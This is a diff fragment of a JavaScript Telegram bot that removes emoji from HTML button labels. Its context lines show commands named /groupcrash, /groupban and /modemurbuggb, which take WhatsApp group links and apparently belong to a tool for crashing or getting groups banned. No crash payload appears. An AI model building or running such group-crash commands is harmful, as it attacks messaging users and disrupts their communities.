+  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
 </tg-button-row>`
   );
 
@@ -2969,7 +2952,7 @@ bot.onText(/^\/(groupcrash)(?:\s+(.+))?$/, async (msg, match) => {
 <tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -3082,8 +3065,8 @@ bot.onText(/^\/(groupcrash)(?:\s+(.+))?$/, async (msg, match) => {
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
-  <tg-button type="url" url="${link}" style="primary">🔗 group link</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
+  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
 </tg-button-row>`
   );
 
@@ -3127,7 +3110,7 @@ bot.onText(/^\/(groupban)(?:\s+(.+))?$/, async (msg, match) => {
 <tr><td>example</td><td>/${commandName} https://chat.whatsapp.com/abcd1234</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       msg.message_id
     );
@@ -3240,8 +3223,8 @@ bot.onText(/^\/(groupban)(?:\s+(.+))?$/, async (msg, match) => {
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">📢 script info</tg-button>
-  <tg-button type="url" url="${link}" style="primary">🔗 group link</tg-button>
+  <tg-button type="url" url="https://t.me/kintanaofficial" style="primary">script info</tg-button>
+  <tg-button type="url" url="${link}" style="primary">group link</tg-button>
 </tg-button-row>`
   );
 
@@ -3264,7 +3247,6 @@ bot.onText(/^\/(groupban)(?:\s+(.+))?$/, async (msg, match) => {
   })();
 });
 
-//============= COMMAND /blockcmd & /block & /unblock & /listblock =============//
 bot.onText(/^\/blockcmd(?:\s+(on|off))?$/i, async (msg, match) => {
   const chatId = msg.chat.id;
   const userId = msg.from.id;
@@ -3472,7 +3454,7 @@ bot.onText(/^\/modemurbuggb(?:\s+(on|off))?$/, async (msg, match) => {
 <tr><td>status</td><td>this command is for groups only</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`
       );
     }
@@ -3489,7 +3471,7 @@ bot.onText(/^\/modemurbuggb(?:\s+(on|off))?$/, async (msg, match) => {
 <tr><td>status</td><td>only owner or premium admins</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`
       );
     }
@@ -3579,7 +3561,7 @@ bot.onText(/^\/addprem(?:\s(.+))?$/i, (msg, match) => {
 <tr><td>example</td><td>/addprem 123456789</td></tr>
 </table>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
             msg.message_id
         );
@@ -3852,7 +3834,7 @@ bot.onText(/^\/info(?:\s|$)/i, async (msg) => {
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="${profileUrl}" style="primary">👤 telegram profile</tg-button>
+  <tg-button type="url" url="${profileUrl}" style="primary">telegram profile</tg-button>
 </tg-button-row>`,
     msg.message_id
   );
@@ -3920,7 +3902,6 @@ ${rowsHtml}
   }
 });
 
-// ============ TOOLS ============
 bot.onText(/^\/brat(?:\s+(.+))?$/i, async (msg, match) => {
     const chatId = msg.chat.id;
     const text = match?.[1];
@@ -4020,8 +4001,8 @@ bot.onText(/^\/tourl$/, async (msg) => {
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="${finalUrl}" style="primary">🔗 open url</tg-button>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="${finalUrl}" style="primary">open url</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
             msg.message_id
         );
@@ -4104,13 +4085,13 @@ bot.onText(/^\/play(?:\s+(.+))?$/i, async (msg, match) => {
 <tg-song>
   <audio controls preload="none" src="${audioUrl}"></audio>
   <footer style="font-size:12px; color:#888; margin-top:6px;">
-    © 2026 — Kintana Bot Telegram
+    © 2026 - Kintana Bot Telegram
   </footer>
 </tg-song>
 
 <tg-button-row>
-  <tg-button type="url" url="${res.source || res.url}" style="primary">🎬 view video</tg-button>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="${res.source || res.url}" style="primary">view video</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`;
 
         await sendRichMenu(chatId, captionHtml, msg.message_id);
@@ -4334,7 +4315,7 @@ bot.onText(/^\/cekfunc$/, async (msg) => {
 </ul>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>
 `;
 
@@ -4389,7 +4370,7 @@ ${snippetRows}
 </ul>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>
 `;
 
@@ -4693,7 +4674,7 @@ async function sendPin(bot, chatId, key) {
 </table>
 
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
         data.replyTo
       );
@@ -4708,10 +4689,10 @@ async function sendPin(bot, chatId, key) {
 </table>
 
 <tg-button-row>
-  <tg-button type="callback_data" data="pin_next_${key}" style="primary">➡️ next 10</tg-button>
+  <tg-button type="callback_data" data="pin_next_${key}" style="primary">next 10</tg-button>
 </tg-button-row>
 <tg-button-row>
-  <tg-button type="url" url="https://t.me/heysaka" style="primary">👨‍💻 creator</tg-button>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
 </tg-button-row>`,
       data.replyTo
     );
